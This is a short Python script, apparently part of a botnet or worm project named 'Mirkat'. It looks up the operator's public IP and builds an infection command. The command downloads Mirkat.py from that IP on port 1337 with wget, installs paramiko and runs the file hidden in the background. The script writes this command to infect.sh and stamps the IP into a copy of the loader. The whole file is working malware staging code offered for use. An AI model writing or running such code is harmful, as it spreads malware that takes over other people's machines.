import requests, os

def setup():
    ip_addr = requests.get('https://api.ipify.org').text
    payload = f'cd /tmp;wget {ip_addr}:1337/Mirkat.py;pip3 install paramiko;nohup python3 Mirkat.py &'

    # Create infect.sh
    with open('../Bin/infect.sh', 'w+') as payload_file:
        payload_file.write(payload)
    
    # Create Mirkat.py
    with open('../Mirkat.py', 'r+') as loader_file:
        with open('../Bin/Mirkat.py', 'w+') as pf:
            pf.write(loader_file.read().replace('_%_addr_%_', ip_addr))

setup()